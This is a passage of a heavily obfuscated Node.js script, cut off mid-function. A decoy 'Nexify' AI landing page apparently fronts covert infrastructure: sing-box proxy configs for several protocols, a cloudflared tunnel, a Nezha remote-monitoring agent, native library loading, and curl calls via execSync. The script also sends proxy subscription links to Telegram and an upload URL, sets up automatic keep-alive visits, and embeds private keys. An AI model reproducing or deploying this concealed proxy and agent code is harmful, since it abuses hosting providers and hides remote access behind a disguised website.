x20\x20//\x20使用字符串拼接代替模板字符串，避免与外层Node.js模板字符串冲突\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20testimonialContainer.innerHTML\x20=\x20\x27\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<div\x20class=\x22testimonial-text\x22>\x22\x27\x20+\x20t.text\x20+\x20\x27\x22</div>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<div\x20class=\x22testimonial-author\x22>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<div\x20class=\x22author-avatar\x22>\x27\x20+\x20t.initials\x20+\x20\x27</div>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<div\x20class=\x22author-info\x22>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<h4>\x27\x20+\x20t.name\x20+\x20\x27</h4>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<p>\x27\x20+\x20t.position\x20+\x20\x27</p>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27</div>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27</div>\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(testimonialContainer\x20&&\x20testimonialData.length)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20updateTestimonial();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20currentIdx\x20=\x20(currentIdx\x20+\x201)\x20%\x20testimonialData.length;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20updateTestimonial();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20},\x205200);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20CTA\x20button\x20alerts\x20(demo\x20interactions)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20allCtaBtns\x20=\x20document.querySelectorAll(\x27.cta-button\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20secondaryBtns\x20=\x20document.querySelectorAll(\x27.secondary-button\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20allCtaBtns.forEach(btn\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20btn.addEventListener(\x27click\x27,\x20(e)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(btn.closest(\x27.cta-section\x27)\x20&&\x20btn.innerText.includes(\x27Get\x20started\x27))\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alert(\x22✨\x20Welcome\x20to\x20Nexify!\x20You\x20would\x20be\x20redirected\x20to\x20the\x20sign-up\x20page\x20in\x20a\x20live\x20version.\x20Start\x20building\x20with\x20AI.\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20if(btn.innerText.includes(\x27Try\x20free\x27)\x20||\x20btn.innerText.includes(\x27Start\x20building\x20free\x27))\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alert(\x22🚀\x20Nexify\x20free\x20trial\x20—\x20instant\x20access\x20to\x20visual\x20AI\x20builder.\x20No\x20credit\x20card\x20required.\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alert(\x22⚡\x20Nexify:\x20Supercharge\x20your\x20workflows.\x20Reach\x20out\x20to\x20our\x20team\x20anytime.\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20secondaryBtns.forEach(btn\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20btn.addEventListener(\x27click\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(btn.innerText.includes(\x27Watch\x20demo\x27))\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alert(\x22🎥\x20Nexify\x20demo:\x20see\x20how\x20to\x20build\x20an\x20AI\x20agent\x20in\x203\x20minutes\x20(full\x20walkthrough\x20available).\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20if(btn.innerText.includes(\x27Start\x20free\x20trial\x27)\x20||\x20btn.innerText.includes(\x27Contact\x20sales\x27))\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alert(\x22📞\x20Our\x20team\x20will\x20reach\x20out\x20shortly.\x20Meanwhile\x20explore\x20our\x20free\x20tier.\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alert(\x22💡\x20More\x20info\x20about\x20Nexify\x20plans\x20—\x20check\x20our\x20docs\x20or\x20talk\x20to\x20sales.\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20close\x20mobile\x20menu\x20on\x20resize\x20if\x20needed\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20window.addEventListener(\x27resize\x27,\x20function()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if(window.innerWidth\x20>\x20768\x20&&\x20navLinks)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.display\x20=\x20\x27\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.removeProperty(\x27flex-direction\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.removeProperty(\x27position\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.removeProperty(\x27top\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.removeProperty(\x27width\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.removeProperty(\x27padding\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.removeProperty(\x27box-shadow\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20if(window.innerWidth\x20<=\x20768\x20&&\x20navLinks.style.display\x20===\x20\x27flex\x27)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.display\x20=\x20\x27flex\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.flexDirection\x20=\x20\x27column\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.position\x20=\x20\x27absolute\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.top\x20=\x20\x2780px\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.left\x20=\x20\x270\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.width\x20=\x20\x27100%\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.backgroundColor\x20=\x20\x27#ffffff\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.padding\x20=\x20\x2728px\x2024px\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20navLinks.style.boxShadow\x20=\x20\x270\x2020px\x2030px\x20rgba(0,0,0,0.08)\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20})();\x0a\x20\x20\x20\x20</script>\x0a</body>\x0a</html>','490oUdNuq','exit','SIGINT','none','--token','existsSync','statusCode','Skipping\x20adding\x20automatic\x20access\x20task','Using\x20cached\x20native\x20library:\x20','countryCode','warn','run','curl\x20-sm\x203\x20ipv6.ip.sb','url','-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a','BggqhkjOPQMBBw==\x0a','resolve','text/html;\x20charset=utf-8','unlinkSync','/api/add-subscriptions','utf-8','has','split','from','alloc','bot\x20is\x20running','write','openai','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=','base64','http','&fp=chrome&insecure=1&allowInsecure=1#','-----BEGIN\x20EC\x20PARAMETERS-----\x0a','http-client-direct','anytls-in','koffi','483709bCNUFH','--protocol','createReadStream','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','s5-in','/vmess-argo','.31888.xyz','vmess://','https://bing.com','MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a','matchAll','/bot.so','\x20is\x20created','HTTP\x20server\x20error:','.tmp','Cleanup\x20failed:','async','?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#','xtls-rprx-vision'];_0x2389=function(){return _0x3614ef;};return _0x2389();}function generateSingBoxConfig(_0x438c29,_0x20aa6a){const _0x53ed1e=_0x71d8d2,_0xa59c22=[];_0xa59c22['push']({'type':_0x53ed1e(0x1cf),'tag':_0x53ed1e(0x141),'listen':'::','listen_port':ARGO_PORT,'users':[{'uuid':UUID}],'transport':{'type':'ws','path':_0x53ed1e(0x18a),'early_data_header_name':_0x53ed1e(0xf7)}});isValidPort(REALITY_PORT)&&_0xa59c22['push']({'type':_0x53ed1e(0x1e6),'tag':'vless-reality','listen':'::','listen_port':parseInt(REALITY_PORT),'users':[{'uuid':UUID,'flow':_0x53ed1e(0x197)}],'tls':{'enabled':!![],'server_name':'www.iij.ad.jp','reality':{'enabled':!![],'handshake':{'server':_0x53ed1e(0x1de),'server_port':0x1bb},'private_key':privateKey,'short_id':['']}}});isValidPort(HY2_PORT)&&_0xa59c22[_0x53ed1e(0x14b)]({'type':_0x53ed1e(0x1e2),'tag':_0x53ed1e(0x154),'listen':'::','listen_port':parseInt(HY2_PORT),'users':[{'password':UUID}],'masquerade':_0x53ed1e(0x18d),'tls':{'enabled':!![],'alpn':['h3'],'certificate_path':_0x438c29,'key_path':_0x20aa6a}});isValidPort(TUIC_PORT)&&_0xa59c22['push']({'type':_0x53ed1e(0x1d7),'tag':_0x53ed1e(0x1d1),'listen':'::','listen_port':parseInt(TUIC_PORT),'users':[{'uuid':UUID,'password':UUID}],'congestion_control':'bbr','tls':{'enabled':!![],'alpn':['h3'],'certificate_path':_0x438c29,'key_path':_0x20aa6a}});isValidPort(S5_PORT)&&_0xa59c22['push']({'type':'socks','tag':_0x53ed1e(0x189),'listen':'::','listen_port':parseInt(S5_PORT),'users':[{'username':UUID[_0x53ed1e(0x128)](0x0,0x8),'password':UUID['slice'](-0xc)}]});isValidPort(ANYTLS_PORT)&&_0xa59c22[_0x53ed1e(0x14b)]({'type':_0x53ed1e(0x1b0),'tag':_0x53ed1e(0x183),'listen':'::','listen_port':parseInt(ANYTLS_PORT),'users':[{'password':UUID}],'tls':{'enabled':!![],'certificate_path':_0x438c29,'key_path':_0x20aa6a}});const _0x4e607e=[{'type':_0x53ed1e(0xff),'tag':'wireguard-out','mtu':0x500,'address':[_0x53ed1e(0x20c),_0x53ed1e(0x122)],'private_key':_0x53ed1e(0x119),'peers':[{'address':'engage.cloudflareclient.com','port':0x968,'public_key':_0x53ed1e(0x1ed),'allowed_ips':[_0x53ed1e(0x1ee),'::/0'],'reserved':[0x4e,0x87,0x4c]}]}],_0x108c2d=(_0x3d387d,_0x17dc3c)=>({'tag':_0x3d387d,'type':_0x53ed1e(0x1ac),'format':'binary','url':_0x17dc3c}),_0x133c37=[_0x108c2d(_0x53ed1e(0x1b2),'https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/netflix.srs'),_0x108c2d(_0x53ed1e(0x17c),'https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs')],_0x1616cd=['netflix'];let _0x5ce325=YT_WARPOUT===!![]||YT_WARPOUT===_0x53ed1e(0x1e4);if(!_0x5ce325)try{const _0x436df7=execSync(_0x53ed1e(0x1a7),{'encoding':_0x53ed1e(0x1d9)})[_0x53ed1e(0x125)]();_0x5ce325=_0x436df7!==_0x53ed1e(0x1da);}catch(_0x584883){if(_0x584883[_0x53ed1e(0x1aa)]&&_0x584883[_0x53ed1e(0x1aa)][0x1]){const _0x5e6c76=_0x584883[_0x53ed1e(0x1aa)][0x1][_0x53ed1e(0x1ea)]()['trim']();_0x5ce325=_0x5e6c76!=='200';}else _0x5ce325=!![];}_0x5ce325&&(_0x133c37['push'](_0x108c2d(_0x53ed1e(0x117),_0x53ed1e(0x102))),_0x1616cd[_0x53ed1e(0x14b)](_0x53ed1e(0x117)),console[_0x53ed1e(0x1b8)](_0x53ed1e(0x19a)));const _0x59347c={'default_http_client':_0x53ed1e(0x182),'rule_set':_0x133c37,'rules':[{'rule_set':_0x1616cd,'outbound':_0x53ed1e(0x1b7)}],'final':_0x53ed1e(0x1eb)};return{'log':{'disabled':!![],'level':'error','timestamp':!![]},'http_clients':[{'tag':_0x53ed1e(0x182)}],'inbounds':_0xa59c22,'endpoints':_0x4e607e,'outbounds':[{'type':_0x53ed1e(0x1eb),'tag':_0x53ed1e(0x1eb)}],'route':_0x59347c};}function generateNezhaConfig(){const _0x9277b0=_0x71d8d2,_0x3d48ea=NEZHA_SERVER[_0x9277b0(0x20a)](':')?NEZHA_SERVER[_0x9277b0(0x177)](':')['pop']():'',_0x442139=new Set(['443',_0x9277b0(0x1b1),_0x9277b0(0x136),_0x9277b0(0x133),_0x9277b0(0x19b),_0x9277b0(0x145)]),_0x7d6172=_0x442139[_0x9277b0(0x176)](_0x3d48ea)?_0x9277b0(0x1e4):'false',_0x55d449='client_secret:\x20'+NEZHA_KEY+_0x9277b0(0x19e)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x7d6172+_0x9277b0(0x1cc)+UUID;fs['writeFileSync'](nezhaConfigPath,_0x55d449,_0x9277b0(0x1d9));}function cloudflaredPayload(){const _0x41bcef=_0x71d8d2;if(DISABLE_ARGO===_0x41bcef(0x1e4)||DISABLE_ARGO===!![])return null;if(ARGO_AUTH&&ARGO_DOMAIN){if(ARGO_AUTH[_0x41bcef(0x140)](/^[A-Z0-9a-z=]{120,250}$/))return JSON[_0x41bcef(0xfe)]({'args':[_0x41bcef(0x1b9),_0x41bcef(0x13b),_0x41bcef(0x1bf),_0x41bcef(0x146),_0x41bcef(0x186),'http2',_0x41bcef(0x16c),_0x41bcef(0x165),ARGO_AUTH]});else{if(ARGO_AUTH[_0x41bcef(0x140)](/TunnelSecret/))return JSON[_0x41bcef(0xfe)]({'args':[_0x41bcef(0x1b9),_0x41bcef(0x13b),_0x41bcef(0x1bf),_0x41bcef(0x1ce),path[_0x41bcef(0x155)](FILE_PATH,_0x41bcef(0x14c)),'run']});}}return JSON['stringify']({'args':[_0x41bcef(0x1b9),_0x41bcef(0x13b),_0x41bcef(0x1bf),'--no-autoupdate',_0x41bcef(0x186),'http2',_0x41bcef(0x147),bootLogPath,_0x41bcef(0x1a6),_0x41bcef(0x1c1),_0x41bcef(0x1f9),_0x41bcef(0x1cd)+ARGO_PORT]});}function singBoxPayload(){const _0x2de7f6=_0x71d8d2;return JSON[_0x2de7f6(0xfe)]({'config':singBoxConfigPath,'workingDir':'.','disableColor':!![]});}function nezhaPayload(){return JSON['stringify']({'config':nezhaConfigPath});}function waitForQuickTunnelDomain(_0x298525,_0x26234f){const _0x46e34a=_0x71d8d2,_0xe2a15c=Date[_0x46e34a(0x12e)]()+_0x26234f;while(Date[_0x46e34a(0x12e)]()<_0xe2a15c){try{if(fs[_0x46e34a(0x166)](_0x298525)){const _0x1ff386=fs['readFileSync'](_0x298525,_0x46e34a(0x1d9)),_0x51d629=[..._0x1ff386[_0x46e34a(0x18f)](/https:\/\/([A-Za-z0-9.-]+\.trycloudflare\.com)/g)];if(_0x51d629[_0x46e34a(0x108)]>0x0)return _0x51d629[_0x51d629['length']-0x1][0x1];}}catch(_0x2a8ee8){}const _0xd6f94e=_0xe2a15c-Date[_0x46e34a(0x12e)]();if(_0xd6f94e<=0x0)break;const _0x2d36aa=Math[_0x46e34a(0x199)](0x3e8,_0xd6f94e);Atomics[_0x46e34a(0x15d)](new Int32Array(new SharedArrayBuffer(0x4)),0x0,0x0,_0x2d36aa);}return null;}async function extractDomain(){const _0x240329=_0x71d8d2;if(DISABLE_ARGO===_0x240329(0x1e4)||DISABLE_ARGO===!![])return null;if(ARGO_AUTH&&ARGO_DOMAIN)return console['log'](_0x240329(0x1be),ARGO_DOMAIN),ARGO_DOMAIN;console[_0x240329(0x1b8)](_0x240329(0x1f8));let _0x417265=waitForQuickTunnelDomain(bootLogPath,0x7530);if(!_0x417265){console[_0x240329(0x1b8)]('Quick\x20tunnel\x20domain\x20not\x20found,\x20retrying...');try{fs[_0x240329(0x173)](bootLogPath);}catch(_0xccdc37){}await new Promise(_0x3845b9=>setTimeout(_0x3845b9,0x1388)),_0x417265=waitForQuickTunnelDomain(bootLogPath,0x7530);}return _0x417265?console['log']('ArgoDomain:',_0x417265):console[_0x240329(0x1b8)](_0x240329(0x1a9)),_0x417265;}async function getMetaInfo(){const _0x513a80=_0x71d8d2;try{const _0x3b7a3a=await axios[_0x513a80(0x20f)](_0x513a80(0x1c9),{'headers':{'User-Agent':_0x513a80(0x110),'timeout':0xbb8}});if(_0x3b7a3a[_0x513a80(0x205)]&&_0x3b7a3a[_0x513a80(0x205)][_0x513a80(0x137)]&&_0x3b7a3a['data'][_0x513a80(0x1d3)])return(_0x3b7a3a[_0x513a80(0x205)][_0x513a80(0x137)]+'-'+_0x3b7a3a['data'][_0x513a80(0x1d3)])[_0x513a80(0x134)](/\s+/g,'_');}catch(_0x5f03a3){try{const _0x4c88b2=await axios[_0x513a80(0x20f)](_0x513a80(0x1d4),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x4c88b2[_0x513a80(0x205)]&&_0x4c88b2['data'][_0x513a80(0x123)]==='success'&&_0x4c88b2['data'][_0x513a80(0x16a)]&&_0x4c88b2[_0x513a80(0x205)][_0x513a80(0x1df)])return(_0x4c88b2[_0x513a80(0x205)]['countryCode']+'-'+_0x4c88b2[_0x513a80(0x205)][_0x513a80(0x1df)])[_0x513a80(0x134)](/\s+/g,'_');}catch(_0x1cf611){}}return _0x513a80(0x153);}async function generateLinks(_0x186ef7){const _0x345353=_0x71d8d2;let _0x322ffa='';try{const _0x4984e3=await axios[_0x345353(0x20f)]('http://ipv4.ip.sb',{'timeout':0xbb8});_0x322ffa=_0x4984e3[_0x345353(0x205)][_0x345353(0x125)]();}catch(_0x37193c){try{_0x322ffa=execSync(_0x345353(0x15b))[_0x345353(0x1ea)]()[_0x345353(0x125)]();}catch(_0x5273f4){try{const _0x1abbc9=await axios[_0x345353(0x20f)](_0x345353(0x112),{'timeout':0xbb8});_0x322ffa='['+_0x1abbc9[_0x345353(0x205)][_0x345353(0x125)]()+']';}catch(_0xc1d1a1){try{_0x322ffa='['+execSync(_0x345353(0x16d))['toString']()[_0x345353(0x125)]()+']';}catch(_0x55302b){console[_0x345353(0x1ba)](_0x345353(0x139),_0x55302b[_0x345353(0xfa)]);}}}}const _0x432a48=await getMetaInfo(),_0x132409=NAME?NAME+'-'+_0x432a48:_0x432a48;await new Promise(_0x15458b=>setTimeout(_0x15458b,0x7d0));let _0x3fa94c='';if(DISABLE_ARGO!=='true'&&DISABLE_ARGO!==!![]&&_0x186ef7){const _0x2463af=_0x345353(0x18c)+Buffer[_0x345353(0x178)](JSON[_0x345353(0xfe)]({'v':'2','ps':''+_0x132409,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x345353(0x1bf),'net':'ws','type':_0x345353(0x164),'host':_0x186ef7,'path':_0x345353(0x19c),'tls':_0x345353(0x142),'sni':_0x186ef7,'alpn':'','fp':_0x345353(0x12f)}))['toString']('base64');_0x3fa94c=_0x2463af;}isValidPort(TUIC_PORT)&&(_0x3fa94c+=_0x345353(0x1a4)+UUID+':'+UUID+'@'+_0x322ffa+':'+TUIC_PORT+_0x345353(0x196)+_0x132409);isValidPort(HY2_PORT)&&(_0x3fa94c+=_0x345353(0x14a)+UUID+'@'+_0x322ffa+':'+HY2_PORT+_0x345353(0x1a0)+_0x132409);isValidPort(REALITY_PORT)&&(_0x3fa94c+=_0x345353(0x1fe)+UUID+'@'+_0x322ffa+':'+REALITY_PORT+_0x345353(0x17d)+publicKey+_0x345353(0x210)+_0x132409);isValidPort(ANYTLS_PORT)&&(_0x3fa94c+='\x0aanytls://'+UUID+'@'+_0x322ffa+':'+ANYTLS_PORT+_0x345353(0x14e)+_0x322ffa+_0x345353(0x180)+_0x132409);if(isValidPort(S5_PORT)){const _0x26456d=Buffer['from'](UUID['substring'](0x0,0x8)+':'+UUID['slice'](-0xc))['toString'](_0x345353(0x17e));_0x3fa94c+='\x0asocks://'+_0x26456d+'@'+_0x322ffa+':'+S5_PORT+'#'+_0x132409;}return console[_0x345353(0x1b8)](_0x345353(0x15e)+Buffer[_0x345353(0x178)](_0x3fa94c)[_0x345353(0x1ea)](_0x345353(0x17e))+_0x345353(0x1dd)),console[_0x345353(0x1b8)]('\x1b[35m'+_0x345353(0x1ab)+_0x345353(0x1dd)),fs[_0x345353(0x14f)](subPath,Buffer['from'](_0x3fa94c)[_0x345353(0x1ea)](_0x345353(0x17e))),fs[_0x345353(0x14f)](listPath,_0x3fa94c,'utf8'),console[_0x345353(0x1b8)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),_0x3fa94c;}async function sendTelegram(){const _0x19b3e6=_0x71d8d2;if(!BOT_TOKEN||!CHAT_ID){console[_0x19b3e6(0x1b8)](_0x19b3e6(0x1db));return;}try{const _0x54ebed=fs['readFileSync'](subPath,'utf8'),_0x2832a4='https://api.telegram.org/bot'+BOT_TOKEN+_0x19b3e6(0x1b3),_0x4435c4=NAME['replace'](/[_*[\]()~`>#+=|{}.!-]/g,_0x19b3e6(0xf6)),_0x419587={'chat_id':CHAT_ID,'text':'**'+_0x4435c4+_0x19b3e6(0x209)+_0x54ebed+_0x19b3e6(0x1e0),'parse_mode':_0x19b3e6(0x1ef)};await axios[_0x19b3e6(0x1c6)](_0x2832a4,null,{'params':_0x419587}),console[_0x19b3e6(0x1b8)](_0x19b3e6(0x138));}catch(_0x4ea2af){console[_0x19b3e6(0x1ba)]('Failed\x20to\x20send\x20Telegram\x20message',_0x4ea2af);}}async function uploadNodes(){const _0x4fcdc5=_0x71d8d2;if(UPLOAD_URL&&PROJECT_URL){const _0x33573f=PROJECT_URL+'/'+SUB_PATH,_0x2719fa={'subscription':[_0x33573f]};try{const _0x1ad108=await axios[_0x4fcdc5(0x1c6)](UPLOAD_URL+_0x4fcdc5(0x174),_0x2719fa,{'headers':{'Content-Type':_0x4fcdc5(0x118)}});if(_0x1ad108[_0x4fcdc5(0x123)]===0xc8)console[_0x4fcdc5(0x1b8)](_0x4fcdc5(0x212));}catch(_0x5ed7b2){}}else{if(UPLOAD_URL){if(!fs[_0x4fcdc5(0x166)](listPath))return;const _0x5c0840=fs[_0x4fcdc5(0x10b)](listPath,_0x4fcdc5(0x175)),_0x4aa0fa=_0x5c0840[_0x4fcdc5(0x177)]('\x0a')[_0x4fcdc5(0x1d8)](_0x29d0d6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x29d0d6));if(_0x4aa0fa['length']===0x0)return;try{const _0x5ae2bd=await axios[_0x4fcdc5(0x1c6)](UPLOAD_URL+_0x4fcdc5(0x1dc),JSON[_0x4fcdc5(0xfe)]({'nodes':_0x4aa0fa}),{'headers':{'Content-Type':_0x4fcdc5(0x118)}});if(_0x5ae2bd[_0x4fcdc5(0x123)]===0xc8)console['log']('Subscription\x20uploaded\x20successfully');}catch(_0x2cba1e){}}}}async function addVisitTask(){const _0xa2dca4=_0x71d8d2;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xa2dca4(0x1b8)](_0xa2dca4(0x168));return;}try{await axios[_0xa2dca4(0x1c6)](_0xa2dca4(0x1f1),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa2dca4(0x118)}}),console['log']('Automatic\x20access\x20task\x20added\x20successfully');}catch(_0x5d540f){console[_0xa2dca4(0x1ba)](_0xa2dca4(0x15f)+_0x5d540f[_0xa2dca4(0xfa)]);}}function startHttpServer(_0x3e9281){const _0xd94b4e=http['createServer']((_0x507f9f,_0x1e5e5c)=>{const _0x2add6f=_0x40b3;if(_0x507f9f[_0x2add6f(0xf4)]!==_0x2add6f(0xfd)){_0x1e5e5c[_0x2add6f(0x167)]=0x195,_0x1e5e5c[_0x2add6f(0x15c)](_0x2add6f(0x1c0));return;}const _0x82df0d=new URL(_0x507f9f[_0x2add6f(0x16e)],'http://localhost');if(_0x82df0d[_0x2add6f(0x124)]===subscribePath){_0x1e5e5c[_0x2add6f(0x1a1)](_0x2add6f(0x1ec),_0x2add6f(0x11d));const _0x19e1c9=Buffer[_0x2add6f(0x178)](_0x3e9281)['toString']('base64');_0x1e5e5c[_0x2add6f(0x15c)](_0x19e1c9);}else 